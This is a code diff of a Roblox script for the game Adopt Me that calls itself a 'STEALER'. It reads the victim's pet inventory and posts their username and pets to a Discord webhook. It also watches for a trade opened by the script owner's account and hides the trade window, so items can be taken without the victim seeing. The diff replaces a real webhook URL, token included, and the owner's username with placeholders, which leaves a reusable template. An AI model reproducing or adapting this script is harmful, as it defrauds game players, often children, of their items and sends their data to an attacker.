@@ -4,7 +4,7 @@ local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
 -- Replace this with your webhook URL
-local webhookURL = "https://discord.com/api/webhooks/1363407900919464118/n5PZ4G9oqMO87J2zwybYC9K8TQcCuZqZAJIbozW0vz1vD8d0AwFPrqFNMvxLdYzncT3H"
+local webhookURL = "YOUR_WEBHOOK_URL"
 
 -- Get pet inventory
 local inventory = require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[LocalPlayer.Name].inventory
@@ -18,7 +18,7 @@ end
 local payload = {
     ["username"] = "Shadow Scripting Adopt Me STEALER",
     ["embeds"] = {{
-        ["title"] = " SHADOW SCRIPTING STEALER New Player Executed Script",
+        ["title"] = "New Player Executed Script",
         ["fields"] = {
             {["name"] = "Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
             {["name"] = "Pets", ["value"] = table.concat(petNames, ", "), ["inline"] = false},
@@ -43,7 +43,7 @@ pcall(function()
 end)
 
 -- Listen for trade trigger from owner
-local OWNER_NAME = "textboy1230" -- change this to your actual Roblox username
+local OWNER_NAME = "YourRobloxUsernameHere" -- change this to your actual Roblox username
 local playerGui = LocalPlayer:WaitForChild("PlayerGui")
 local tradeFrame = playerGui:WaitForChild("TradeApp").Frame
 
@@ -84,3 +84,4 @@ tradeFrame:GetPropertyChangedSignal("Visible"):Connect(function()
     if tradeFrame.Visible then
         tradeFrame.Visible = false
     end
+end)
